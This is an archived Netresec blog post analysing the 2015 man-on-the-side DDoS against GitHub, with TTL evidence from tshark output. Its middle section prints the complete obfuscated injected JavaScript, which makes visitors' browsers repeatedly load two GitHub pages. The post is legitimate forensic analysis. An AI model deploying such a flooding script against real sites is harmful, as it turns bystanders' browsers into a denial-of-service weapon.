<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>China's Man-on-the-Side Attack on GitHub</title>
<link rel="stylesheet" href="../css/article.css" />
</head>
<body>
<div class="m-content">
<h1>China's Man-on-the-Side Attack on GitHub</h1>
<div class="blogPost"><span>Tuesday, 31 March 2015 01:15:00 (UTC/GMT)</span><br /><img src="http://www.netresec.com/images/GitHub_twitter_DDoS_522x250.png" alt="GitHub tweeting about DDoS attack" /><p>
        On March 27 The following message was <a href="https://github.com/blog/1981-large-scale-ddos-attack-on-github-com">posted</a> on the official GitHub blog:

        <blockquote>
          We are currently experiencing the largest DDoS (distributed denial of service) attack in github.com's history.
          The attack began around 2AM UTC on Thursday, March 26, and involves a wide combination of attack vectors.
          These include every vector we've seen in previous attacks as well as some sophisticated new techniques that use the web browsers of unsuspecting,
          uninvolved people to flood github.com with high levels of traffic.
          Based on reports we've received, we believe the intent of this attack is to convince us to remove a specific class of content.
        </blockquote></p><p>
        We have looked closer at this attack, and can conclude that China is using their active and passive network infrastructure
        in order to perform a
        <a href="https://en.wikipedia.org/wiki/Man-on-the-side_attack" rel="nofollow">man-on-the-side</a> attack against GitHub.
        See our "TTL analysis" at the end of this blog post to see how we know this is a Man-on-the-side attack.
      </p><p>
        In short, this is how this Man-on-the-Side attack is carried out:
        <ol><li>An innocent user is browsing the internet from outside China.</li><li>One website the user visits loads a JavaScript from a server in China, for example the Badiu Analytics script that often is used by web admins to track visitor statistics (much like Google Analytics).</li><li>The web browser's request for the Baidu JavaScript is detected by the Chinese passive infrastructure as it enters China.</li><li>A fake response is sent out from within China instead of the actual Baidu Analytics script. This fake response is a malicious JavaScript that tells the user's browser to continuously reload two specific pages on GitHub.com.</li></ol></p><p>
        However, not all users loading JavaScripts from inside China are attacked in this way.
        Our analysis shows that only about 1% of the requests for the Baidu Analytics script are receiving the malicious JavaScript as response.
        So in 99% of the cases everything behaves just like normal.
      </p><p>
        We managed to get a browser to load the malicious JavaScript simply by browsing a few Chinese websites.
        After the JavaScript loaded we observed the following behavior in our network traffic:

        <img src="http://www.netresec.com/images/GitHub_DDoS_GANNT_chart_522x573.png" alt="CapLoader Gantt chart of traffic generated by the malicious JavaScript" /><i>Image: <a href="http://caploader.com/">CapLoader</a> Gantt chart of traffic generated by the malicious JavaScript</i></p><p>
        The script got our browser to connect to github.com (IP address 192.30.252.[128-131]) in an infinite loop.
      </p><p><b>Baidu Analytics</b></p><p>
        The Baidu Analytics script can be loaded from URLs like:<br />http://hm.baidu.com/h.js?0deadbeef000deadbeef000deadbeef0 <i>(normal version)</i><br />http://hm.baidu.com/hm.js?0deadbeef000deadbeef000deadbeef0 <i>(asynchronous version)</i></p><p>
        The proper JavaScript received when requesting such an URL should look like this:
        <img src="http://www.netresec.com/images/baidu_analytics_script_522x413.png" alt="Baidu Analytics script in CapLoader" /><i>
          Image: CapLoader <a href="http://netresec.com/?b=13135F8">flow transcript</a> of the Baidu Analytics script
        </i></p><p>
        The injected response with the malicous JavaScript looks like this:
        <img src="http://www.netresec.com/images/malicious_baidu_script_522x579.png" alt="Malicious JavaScript in CapLoader" /><i>
          Image: CapLoader <a href="http://netresec.com/?b=13135F8">flow transcript</a> of the malicious JavaScript
        </i></p><p>
        The injected response is actually exactly the same every time, consisting of three TCP packets with the following payload:</p><p><b>Injected packet #1:</b><blockquote>
          HTTP/1.1 200 OK<br />Server: Apache<br />Connection: close<br />Content-Type: text/javascript<br />Content-Length: 1130</blockquote></p><p><br /><b>Injected packet #2:</b><blockquote><br />eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?\'\':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return\'\\\\w+\'};c=1};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p}(\'l.k("&lt;5 p=\\\'r://H.B.9/8/2.0.0/8.C.t\\\'&gt;\\\\h/5&gt;");!J.K&amp;&amp;l.k("&lt;5 p=\\\'r://L.8.9/8-T.t\\\'&gt;\\\\h/5&gt;");j=(6 4).c();7 g=0;3 i(){7 a=6 4;V 4.Z(a.10(),a.w(),a.x(),a.11(),a.y(),a.z())/A}d=["m://n.9/E","m://n.9/F-G"];o=d.I;3 e(){7 a=i()%o;q(d[a])}3 q(a){7 b;$.M({N:a,O:"5",P:Q,R:!0,S:3(){s=(6 4).c()},U:3(){f=(6 4).c();b=W.X(f-s);Y&gt;f-j&amp;&amp;(u(b),g+=1)}})}3 u(a){v("e()",a)}v("e()",D);\',62,64,\'|||function|Date|script|new|var|jquery|com|||getTime|url_array|r_send2|responseTime|count|x3c|unixtime|startime|write|document|https|github|NUM|src|get|http|requestTime|js|r_send|setTimeout|getMonth|getDay|getMinutes|getSeconds|1E3|baidu|min|2E3|greatfire|cn|nytimes|libs|length|window|jQuery|code|ajax|url|dataType|timeou
        </blockquote><br /><b>Injected packet #3:</b><blockquote>
          t|1E4|cache|beforeSend|latest|complete|return|Math|floor|3E5|UTC|getFullYear|getHours'.split('|'),0,{}))<br /></blockquote></p><p>
        The malicious JavaScript is somewhat obfuscated, but some simple deobfuscation leaves us with the following code:

        <a href="http://pastebin.com/NM7ij09e"><img src="http://www.netresec.com/images/malicious_baidu_script_deobfuscated_522x607.png" alt="Deobfuscated JavaScript" /></a></p><p>
        As can be seen in the code, the two targeted URLs are <a href="https://github.com/greatfire">github.com/greatfire</a> and <a href="https://github.com/cn-nytimes">github.com/cn-nytimes</a>,
        which are mirror sites for GreatFire.org and the Chinese New York Times.
        GreatFire and NYT both use GitHub to circumvent the online censorship performed by the Great Firewall of China (GFW).
      </p><p><b>TTL Analysis</b></p><p>
        Time-To-Live (TTL) analysis is a powerful method that can be used in order to analyze Man-in-the-Middle as well as Man-on-the-Side attacks.
        We've used this method before when analyzing the Chinese MITM attacks on
        <a href="http://netresec.com/?b=14AA3E6">iCloud</a>,
        <a href="http://netresec.com/?b=14AC5EE">Yahoo</a>,
        <a href="http://netresec.com/?b=14955CB">Google</a> and
        <a href="http://netresec.com/?b=1328C6B">GitHub</a>.
      </p><p>
        What is interesting with this new attack on GitHub is that the attackers are now trying to
        make it difficult to locate the injection point of the malicious JavaScript by modifying the IP TTL values of injected packets.
      </p><p>
        The following Tshark output prints Source-IP, Destination-IP, TCP-Flags and IP-TTL in four columns (comments in yellow):
        <blockquote>
          tshark -r baidu-high-ttl.pcap -T fields -e ip.src -e ip.dst -e tcp.flags -e ip.ttl<br />192.168.70.160	61.135.185.140	0x0002	64 <span>&lt;- SYN (client)</span><br />61.135.185.140	192.168.70.160	0x0012	42 <span>&lt;- SYN+ACK (server)</span><br />192.168.70.160	61.135.185.140	0x0010	64 <span>&lt;- ACK (client)</span><br />192.168.70.160	61.135.185.140	0x0018	64 <span>&lt;- HTTP GET (client)</span><br />61.135.185.140	192.168.70.160	0x0018	227 <span>&lt;- Injected packet 1 (injector)</span><br />192.168.70.160	61.135.185.140	0x0010	64<br />61.135.185.140	192.168.70.160	0x0018	228 <span>&lt;- Injected packet 2 (injector)</span><br />61.135.185.140	192.168.70.160	0x0019	229 <span>&lt;- Injected packet 3 (injector)</span><br />192.168.70.160	61.135.185.140	0x0010	64<br />192.168.70.160	61.135.185.140	0x0011	64
        </blockquote></p><p>
        Notice how the TTL of the SYN+ACK packet from the server is 42, while the three injected packets with payload have TTL values of 227, 228 and 229?
      </p><p>Here is another PCAP file where injected packets have low TTL values:
      <blockquote>
        tshark -r baidu-low-ttl.pcap -T fields -e ip.src -e ip.dst -e tcp.flags -e ip.ttl<br />192.168.70.160	61.135.185.140	0x0002	64 <span>&lt;- SYN (client)</span><br />61.135.185.140	192.168.70.160	0x0012	42 <span>&lt;- SYN+ACK (server)</span><br />192.168.70.160	61.135.185.140	0x0010	64 <span>&lt;- ACK (client)</span><br />192.168.70.160	61.135.185.140	0x0018	64 <span>&lt;- HTTP GET (client)</span><br />61.135.185.140	192.168.70.160	0x0018	30 <span>&lt;- Injected packet 1 (injector)</span><br />192.168.70.160	61.135.185.140	0x0010	64 <br />61.135.185.140	192.168.70.160	0x0018	31 <span>&lt;- Injected packet 2 (injector)</span><br />61.135.185.140	192.168.70.160	0x0019	32 <span>&lt;- Injected packet 3 (injector)</span><br />192.168.70.160	61.135.185.140	0x0010	64 <br />192.168.70.160	61.135.185.140	0x0011	64
      </blockquote></p><p>
        The server's SYN+ACK packet stays at an IP TTL of 42 pretty much throughout our whole analysis, but the TTL of packets carrying the malicious payload varied between 30 and 229.
        This behavior implies that the SYN+ACK packet we are seeing is coming from the actual Baidu server, while the packets carrying the malicious payload are injected somewhere else.
      </p><p>
        As we've mentioned before the three injected packets are always carrying identical payloads and the only thing that changes in between sessions is basically the target TCP port.
        This further strengthens our assumption that these three packets are being injected.
        We even tried dropping one of the injected packets and thereby requesting a retransmission of that packet from the server, but we got nothing back.
        This too is a typical artifact showing that the malicious JavaScript has been delivered through injected packets as part of a Man-on-the-Side attack as opposed to coming from the actual Baidu server.
      </p><p><b>Additional Sources for the Malicious JS</b></p><p>
        The Baidu Analytics is not the only script that has been replaced with a malicious one.
        Users have also <a href="http://www.solidot.org/story?sid=43489">reported</a> JavaScript replacements of Baidu Ads as well as several other services.
        In GreatFire.org's <a href="https://drive.google.com/file/d/0ByrxblDXR_yqeUNZYU5WcjFCbXM/view?pli=1">technical analysis</a>
        of the DDoS attack against them they mention that they have seen JavaScripts being replaced for URLs like:
        <ul><li>hm.baidu.com/h.js</li><li>cbjs.baidu.com/js/o.js</li><li>dup.baidustatic.com/tpl/wh.js</li><li>dup.baidustatic.com/tpl/ac.js</li><li>dup.baidustatic.com/painter/clb/fixed7o.js</li><li>dup.baidustatic.com/painter/clb/fixed7o.js</li><li>eclick.baidu.com/fp.htm?br= ...</li><li>pos.baidu.com/acom?adn= ...</li><li>cpro.baidu.com/cpro/ui/uijs.php?tu=...</li><li>pos.baidu.com/sync_pos.htm?cproid=...</li></ul></p><p>
        These domains are all owned by Baidu, but technically any JavaScript from any site in China could have been exploited to perform this sort of Man-on-the-side attack.
      </p><a href="http://www.fotopedia.com/items/flickr-48955161" title="Great Wall of China by beggs"><img src="http://www.netresec.com/images/Great_Wall_of_China_532x221.png" alt="Great Wall of China by beggs" border="0" /></a><p><b>Conclusions</b></p><p>
        This attack demonstrates how the vast passive and active network filtering infrastructure in China,
        known as the Great Firewall of China or "GFW", can be used in order to perform powerful DDoS attacks.
        Hence, the GFW cannot be considered just a technology for inspecting and censoring the Internet traffic of Chinese citizens,
        but also a platform for conducting DDoS attacks against targets world wide with help of innocent users visiting Chinese websites.
      </p><p><b>UPDATE - April 2'nd</b></p><p>
        Robert Graham of Errata Security has now verified our conclusion, that the attack is comming from China, by performing an "http-traceroute".
        Robert <a href="http://blog.erratasec.com/2015/04/pin-pointing-chinas-attack-against.html">writes</a>:
        <blockquote>
          Using my custom <i>http-traceroute</i>, I've proven that the <i>man-in-the-middle</i> machine attacking GitHub is located on or near the Great Firewall of China.
          While many explanations are possible, such as hackers breaking into these machines, the overwhelmingly most likely suspect for the source of the
          GitHub attacks is the Chinese government.
        </blockquote></p><p>
        If you would like to learn how to detect and analyze man-on-the-side attacks, then we recommend that you sign up for our two-day
        <a href="http://www.netresec.com/?page=Training">Network Forensics Class</a>, which will be held in Stockholm on the 15-16'th of September.
      </p><p><a target="_blank" class="invisibleLink" href="http://www.addthis.com/bookmark.php?source=tbx32nj-1.0&amp;=250&amp;pubid=xa-4d7526e93a9537a7&amp;url=http%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2015-03%26post%3dChina%27s-Man-on-the-Side-Attack-on-GitHub&amp;title=China%27s%20Man-on-the-Side%20Attack%20on%20GitHub"><img src="http://www.netresec.com/images/share/more.gif" border="0" alt="More..." />
          Share
        </a>
        &nbsp;|&nbsp;
        <a target="_blank" title="Share on Facebook" href="http://www.facebook.com/sharer.php?u=http%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2015-03%26post%3dChina%27s-Man-on-the-Side-Attack-on-GitHub"><img src="http://www.netresec.com/images/share/facebook.gif" border="0" alt="Facebook" /></a>
        &nbsp;
        <a target="_blank" title="Share on Twitter" href="http://twitter.com/?status=China%27s%20Man-on-the-Side%20Attack%20on%20GitHub%3a%20http%3a%2f%2fnetres.ec%2f%3fb=153DB4E%20via%20%40netresec"><img src="http://www.netresec.com/images/share/twitter.gif" border="0" alt="Twitter" /></a>
        &nbsp;
        <a target="_blank" title="Submit to reddit" href="http://www.reddit.com/r/netsec/submit?url=http%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2015-03%26post%3dChina%27s-Man-on-the-Side-Attack-on-GitHub"><img src="http://www.netresec.com/images/share/reddit.gif" border="0" alt="Reddit" /></a>
        &nbsp;
        <a target="_blank" title="Submit to Hacker News on Y Combinator" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2015-03%26post%3dChina%27s-Man-on-the-Side-Attack-on-GitHub&amp;t=China%27s%20Man-on-the-Side%20Attack%20on%20GitHub"><img src="http://www.netresec.com/images/share/ycombinator_16x16.png" border="0" alt="Hacker News" /></a><span>
          Short URL: 
          <a href="http://netres.ec/?b=153DB4E">
            http://netres.ec/?b=153DB4E</a></span></p><p class="shadyText">
        Posted by Erik Hjelmvik on Tuesday, 31 March 2015 01:15:00 (UTC/GMT)</p></div></div>
<script>var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-34802167-1']); _gaq.push(['_setDomainName', 'liuzhe.co']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })();</script></body>
</html>